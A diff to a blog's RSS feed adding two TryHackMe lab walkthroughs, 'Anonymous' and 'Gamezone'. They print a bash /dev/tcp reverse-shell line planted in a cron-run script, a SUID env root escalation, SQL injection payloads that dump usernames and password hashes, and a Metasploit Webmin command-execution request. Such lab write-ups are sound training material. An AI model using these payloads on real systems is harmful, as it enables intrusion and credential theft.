@@ -14,7 +14,85 @@
       
       <guid>https://5ysk3y.github.io/thm/guides/anonymous/</guid>
       <description>Overview Welcome to this walkthrough of the TryHackMe room, Anonymous .
-This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.</description>
+This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/anonymous.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Welcome to this walkthrough of the &lt;a href=&#34;https://tryhackme.com&#34; target=&#34;_blank&#34;&gt;TryHackMe&lt;/a&gt;
+ room, &lt;a href=&#34;https://tryhackme.com/room/anonymous&#34; target=&#34;_blank&#34;&gt;Anonymous&lt;/a&gt;
+.&lt;/p&gt;
+&lt;p&gt;This Medium Linux room leverages anonymous access to an FTP service in order to modify a script that&amp;rsquo;s run via cron every five minutes. This gets us a user shell and, from there, we abuse a SUID binary to get ourselves a root shell. All in all, this is a fun room to accomplish and has touches of OSCP-like concepts.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;As always we begin our enumeration with an NMAP scan. I&amp;rsquo;ve condensed it slightly to lessen the output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;21/tcp  open  ftp         syn-ack vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable
+
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
+
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;There&amp;rsquo;s two services that peaked my interest off the bat; FTP and SMB. Looking at both, they allow anonymous access. If we check SMB first, we can see a couple of files in a &lt;code&gt;pics&lt;/code&gt; share - downloading them and running them through &lt;code&gt;binwalk&lt;/code&gt; doesn&amp;rsquo;t show any hidden data. For now, we&amp;rsquo;ll assume this is intended as a distraction.&lt;/p&gt;
+&lt;p&gt;Turning to FTP, there&amp;rsquo;s a few files we can see through our anonymous login. A shell script, a log file and a text file. The latter txt file outlines how &lt;code&gt;anonymous&lt;/code&gt; access should probably be disabled in the form of a note from the author&amp;ndash; I&amp;rsquo;d agree. The log file we see is exactly that as it contains log entries. Finally we have a shell script called &lt;code&gt;clean.sh&lt;/code&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-rwxr-xrwx    1 1000     1000          346 May 19 18:31 clean.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Reading the scripts contents, we can see that this file is responsible for updating the log file we found:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+echo $tmp_files
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $tmp_files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+        echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Running cleanup script:  nothing to delete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; LINE in $tmp_files; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
+        rm -rf /tmp/$LINE &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;date&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; | Removed file /tmp/&lt;/span&gt;$LINE&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;&lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Its a simple if/else statement that executes an echo statment that gets redirected into our log, based on the value of a defined variable. What the script is doing isn&amp;rsquo;t actually the important bit, the important bit is that, as well as read access to the file, also have permission to modify it. Attempts to download the script locally, modify it and re-upload seemingly failed, likely because the re-uploaded file doesn&amp;rsquo;t retain the right user permissions&amp;ndash; by default the file is owned by UID/GID 1000, if we re-upload the file this number changes to something else.&lt;/p&gt;
+&lt;p&gt;That said, we can modify files directly on the FTP server. I used &lt;code&gt;lftp&lt;/code&gt; here because I have mad issues with the standard Linux FTP binary if active mode is being used (it&amp;rsquo;s a FW problem I&amp;rsquo;ve not fixed yet):&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;lftp anonymous@10.10.210.243:/scripts&amp;gt; edit clean.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This opens the file up in vim &amp;ndash; note this is a local instance of vim, so breaking out of it is going to put you into a shell on your own local machine &amp;ndash; and from there we can edit it. For testing purposes I added a simple cURL command to the bottom of the file:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;curl 10.11.x.x/test&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Initially I thought things weren&amp;rsquo;t working until suddenly I got this through on my Python listener:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:45:03] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now, if we look at the time this occured we can see it was just after the 45th minute of the current hour - I left it and observed to see when, if at all, we got another hit and low and behold:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;10.10.210.243 - - [19/May/2020 19:50:04] &amp;quot;GET /test HTTP/1.1&amp;quot; 404 -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This should make it apparant that there&amp;rsquo;s something (we can assume it is a cron) running this script every 5 minutes. That makes the wait time between changes a bit painful but we have confirmed we can execute code. As I don&amp;rsquo;t trust 99% of rooms to contain a copy of &lt;code&gt;nc&lt;/code&gt; that includes the &lt;code&gt;-e&lt;/code&gt; executable flag, I decided to try a BASH specific method to get a shell, as we&amp;rsquo;re modifying a bash script. This is a method listed under the &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34; target=&#34;_blank&#34;&gt;Pentest Monkey CheatSheet&lt;/a&gt;
+:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Replacing this with my relevant IP and a port with an active listener, I waited until I finally got a connection:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nc -nlvp 9001
+bash: cannot set terminal process group (1451): Inappropriate ioctl for device
+bash: no job control in this shell
+namelessone@anonymous:~$ whoami
+namelessone
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This gets us some shell access and the user.txt flag.&lt;/p&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Next up, as is standard practice whilst I poke around, I set off &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&#34; target=&#34;_blank&#34;&gt;linPEAS&lt;/a&gt;
+ - this actually highlighted our privilage escalation vector. Reading though the output of a completed scan, I could see a particularly interesting binary listed under SUID binaries found on the system:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/env&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This is not a typical SUID binary on a Linux system and having it as one is a good way to allow abuse to occur. If we run the name of this binary, &lt;code&gt;env&lt;/code&gt;, through the ever-popular &lt;a href=&#34;https://gtfobins.github.io/gtfobins/env/&#34; target=&#34;_blank&#34;&gt;GTFOBins&lt;/a&gt;
+ we can see that this can be used to gain access to root if the SUID bit is set. To take advantage of this we can run the following from our current user shell:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
+id
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;Note that unless you have a full TTY you likely won&amp;rsquo;t get any output once you&amp;rsquo;ve elevated to root, but commands will still run. You&amp;rsquo;ll also retain your UID/GID, but the EUID (effective user-ID) will be set to root, which means you&amp;rsquo;re basically root. This will enable you to go and grab the root flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;TL;DR - keep it simple and be careful and this room shouldn&amp;rsquo;t give you too much trouble.&lt;/p&gt;
+&lt;p&gt;This is a nice little OSCP-like box in terms of the things you have to check, and the room name provides the clue that we get initial access through anonymous logins. It was rated medium - many of the concepts used are basic so I wouldn&amp;rsquo;t personally say it&amp;rsquo;s that hard. It&amp;rsquo;s more about observation and ensuring that you&amp;rsquo;re not digging yourself a grave by, for example, re-uploading a modified file with incorrect permissions.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -23,7 +101,164 @@ This Medium Linux room leverages anonymous access to an FTP service in order to 
       <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
       
       <guid>https://5ysk3y.github.io/thm/guides/gamezone/</guid>
-      <description>Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone . This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that.</description>
+      <description>Overview Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, Gamezone . This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Today I&amp;rsquo;ll be bringing you a guide for the Try Hack Me room, &lt;a href=&#34;https://tryhackme.com/room/gamezone&#34; target=&#34;_blank&#34;&gt;Gamezone&lt;/a&gt;
+. This is an invaluable room for anyone looking to familiarize themselves with OSCP level concepts as the first stage leverages an ORDER BY/UNION SQL injection. During this walkthrough we&amp;rsquo;re going to manually exploit the injection, instead of relying on SQLMap to do it for us, in order to get a password. From there we use SSH Port Forwarding to gain access to a Webmin service that&amp;rsquo;s locked down, before we use metasploit to compromise that. This was a really fun room so, let&amp;rsquo;s go!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;As is standard, we start off our process with an nmap scan to determine what ports we can listen on:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 26 04:38:10 2020 as: nmap -Pn -sC -sV -oA initial -v 10.10.250.216
+Nmap scan report for 10.10.250.216
+Host is up (0.032s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Apr 26 04:38:24 2020 -- 1 IP address (1 host up) scanned in 14.22 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;As we can see, there&amp;rsquo;s 2 ports Open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH (7.2p2)&lt;/li&gt;
+&lt;li&gt;Apache (2.4.18)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The main site on port 80 has no associated CMS - it looks bloody old. There&amp;rsquo;s a login form on the left side thats exploitable via cassic SQL injection, a la &lt;code&gt;admin&#39; OR 1=1 -- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This simple injection allows us to bypass the main login, however once we get to the &amp;ldquo;admin panel&amp;rdquo; there&amp;rsquo;s another SQL injectable form in the guise of a search field - passing this to burpsuite, we can start to enumerate number of columns in the table that&amp;rsquo;s being queried by default; we do this by using  &lt;code&gt;ORDER BY&lt;/code&gt;  and we continue to increment its value until we get an error. The following query was the last I submit &lt;em&gt;before&lt;/em&gt; I recieved an error indicating that, in this case, the target table has 3 colums:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; ORDER BY 3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now we have this information we can then use &lt;code&gt;union&lt;/code&gt; to confirm we can inject information onto the page:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,2,3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This produces &amp;ldquo;1,2,3&amp;rdquo; on the page and we can hijack one of these and replace it with a nested SQL statement or, to test, a string:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,&amp;quot;5ysk3y&amp;quot;,3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This renders the word &lt;code&gt;5ysk3y&lt;/code&gt; on the page in place of the second colmn - if we replace that second value with a mySQL function instead, like &lt;code&gt;user()&lt;/code&gt;, we get &lt;code&gt;root@localhost&lt;/code&gt; printed on the page. So we can now start to enumerate stuff as we can get the page to output it.&lt;/p&gt;
+&lt;p&gt;As the room asks us to use SQLMap, I&amp;rsquo;ll set that off while I manually exploit this in tandem. The SQLMap command I used is:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -r $(pwd)/search.req --technique=U --batch&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;N.B. As we know its UNION injectable, specifying &lt;code&gt;U&lt;/code&gt; as the technique allows us to target that specifically.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;To manually exploit this we can reference the &lt;code&gt;INFORMATION SCHEMA&lt;/code&gt; database in MySQL - this contains stuff that MySQL itself uses to keep things in order, e.g. other database names as well as tonnes of related data - the &lt;code&gt;SCHEMATA&lt;/code&gt; table specifically contains the names of databases MySQL knows about. The following query would extract those:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As mentioned, to run another query as part of the union it needs to be &lt;code&gt;(nested)&lt;/code&gt; and, in order to view everything that matches our query (as there&amp;rsquo;s more than one value returned in the output) we wrap the target table in the group_concat() function. This gets us the following output on the page in place of the second column:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;information_schema, db, mysql, performance_schema, sys&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The schema/sys/mysql databases belong to MySQL, the &lt;code&gt;db&lt;/code&gt; database seems like it will contain data we may want.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/schemata-table.html&#34; target=&#34;_blank&#34;&gt;This&lt;/a&gt;
+ is a particularly good reference for finding out what tables within INFORMATION_SCHEMA you can query to get information about other DB&amp;rsquo;s to use for further queries/enumeration.&lt;/p&gt;
+&lt;p&gt;As we now have a database to target we can query the names of the tables within that database:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = &#39;db&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which gives us the name of the two tables inside this database:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Posts, Users&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;From there we can start to enumerate the columns within those tables. In this case, I focused on the user table as it&amp;rsquo;s the most interesting:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#39;users&#39;),3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This shows the following columns:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;username, pwd, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which means we can now do some more useful queries, such as:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select username from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which gets us a username:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;agent47&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And we can also query the password as well:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchitem=test&#39; UNION SELECT 1,(select pwd from db.users),3-- -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Which gets us a hash (this is an incomplete version; you&amp;rsquo;ll need to grab it yourself):&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ab5db915fc9cea6c78df88106c6500-[truncated]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We could have also got this via SQLMap by including &lt;code&gt;--dump&lt;/code&gt; in our earlier command, but that&amp;rsquo;s less fun. Also, SQLMap did confirm our original suspicions that this was UNION injectable:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;sqlmap resumed the following injection point(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; stored &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;:
+&lt;span style=&#34;color:#75715e&#34;&gt;---
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Parameter&lt;/span&gt;: searchitem (POST)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;Type&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query
+    Title: Generic &lt;span style=&#34;color:#66d9ef&#34;&gt;UNION&lt;/span&gt; query (&lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; columns
+    Payload: searchitem&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;test&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7171,0x654a55516342637965547842506b644e7a43565354614c63756f4368676e70434165736969574c4a,0x7162716a71)-- -
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Before moving on we must crack that hash to get our user password. I used John for this, although online tools exist to allow you to reverse it that way if you don&amp;rsquo;t have the facility to crack stuff. Due to THM guide rules, I&amp;rsquo;m not able to include this but, that said, aquiring it isn&amp;rsquo;t all that difficult once you have the hash.&lt;/p&gt;
+&lt;p&gt;Success! We get a password. Using the login combination of &lt;code&gt;agent47:&amp;lt;REDACTED&amp;gt;&lt;/code&gt; we can now SSH into the machine and get our user flag.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;Once on the box, we would traditionally enumerate but this is a guided experience so lets stick with the beaten path; running &lt;code&gt;ss&lt;/code&gt; to get a list of listening ports on the box, we see one that stands out due to its number as well as the fact that it didn&amp;rsquo;t appear on our nmap scan:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q           Local Address:Port                  Peer Address:Port
+udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:10000                             *:*
+udp   UNCONN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                *:68                                *:*
+tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;                127.0.0.1:3306                      *:*
+tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:10000                             *:*
+tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              *:22                                *:*
+tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::80                               :::*
+tcp   LISTEN     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;              :::22                               :::*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this is a table to outline what the arguments denote:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/thm/gamezone-ss.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Port 22, 80 and 3306 we can rule out as we know what they are - port 10000, on the other hand, is a little unconventional.&lt;/p&gt;
+&lt;p&gt;It doesn&amp;rsquo;t show up on a full port scan so we can assume the firewall is blocking us. We can&amp;rsquo;t quite confirm just yet but it seems likely:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;agent47@gamezone:~$ cat /etc/iptables/rules.v4
+cat: /etc/iptables/rules.v4: Permission denied
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In order to look into this service, we need to use a &lt;em&gt;local&lt;/em&gt; tunnel via SSH to forward the port from the remote box, back to us, so that it&amp;rsquo;s accessible. In order to do this we can run the following command:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# ssh -L 10000:127.0.0.1:10000 -f -N agent47@10.10.148.87
+agent47@10.10.148.87&#39;s password:
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;-f&lt;/code&gt; flag tells the connection to run in the background, and the &lt;code&gt;-N&lt;/code&gt; flag is required with that to tell SSH that no command execution is required (as it is typically expected).&lt;/p&gt;
+&lt;p&gt;Initially, to confirm what the port is for, I ran nmap against it:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; # nmap -sC -sV -p 10000 -Pn 127.0.0.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 06:33 BST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00012s latency).
+
+PORT      STATE SERVICE VERSION
+10000/tcp open  http    MiniServ 1.580 (Webmin httpd)
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: MiniServ/1.580
+|_http-title: Login to Webmin
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.86 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And visiting it in a browser confirms that its a web accessible console named &lt;code&gt;webmin&lt;/code&gt; - taking a wild guess via our SSH access to the box (since &lt;code&gt;locate&lt;/code&gt; didn&amp;rsquo;t find anything) I tried &lt;code&gt;/etc/webmin&lt;/code&gt; and found most of the files for that service. The majority were unreadable and owned by root but one of them, a file named &lt;code&gt;version&lt;/code&gt; was not:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;agent47@gamezone:/etc/webmin$ cat version
+1.580
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we run this through exploit DB, we will see that there&amp;rsquo;s a metasploit module available to exploit this specific version of webmin:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Webmin 1.580 - &amp;lsquo;/file/show.cgi&amp;rsquo; Remote Command Execution (Metasploit)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If we load that up we can see that it&amp;rsquo;s sending encoded payloads via an authenticated session. This leverages a vulnerability in the services show.cgi component allowing an attacker to run commands with root privilages. We first need credentials though - I initialy tried hydra against the form but got myself banned rather quickly, then I stopped being stupid and tried our existing creds for Agent47 and they do work.&lt;/p&gt;
+&lt;p&gt;The correct metasploit module is &lt;code&gt;exploit/unix/webapp/webmin_show_cgi_exec&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;If we send the module through our burp proxy by running:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set PROXIES http:127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We can follow the chain of events for the most part - its a little more complicated as the payload, in this case, is another metasploit module thats encoded and uploaded via the FileManager functionality in Webmin. Effectively it uploads a file and then executes that via &lt;code&gt;sh&lt;/code&gt; - the default payload is &lt;code&gt;cmd/unix/reverse_perl&lt;/code&gt; and this basically consists of a Perl command that will intiiate a reverse shell. This gets dumped into a file thats named using a random set of characters/numbers and then called in the following manner:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /file/show.cgi/bin/UP8Qmwh|sh -c
+Host: 127.0.0.1:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=e6b8f4f5ff9b17ac77529c6e91c88667
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Assuming the file exists and the payload is correct, it&amp;rsquo;ll get executed. I may see if I can supply a manual payload at a later date, for now though Metasploit is the easiest way to handle this.&lt;/p&gt;
+&lt;p&gt;This gets you a shell, though, and as the root user non-the-less. From there you can proceed to get the flag.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
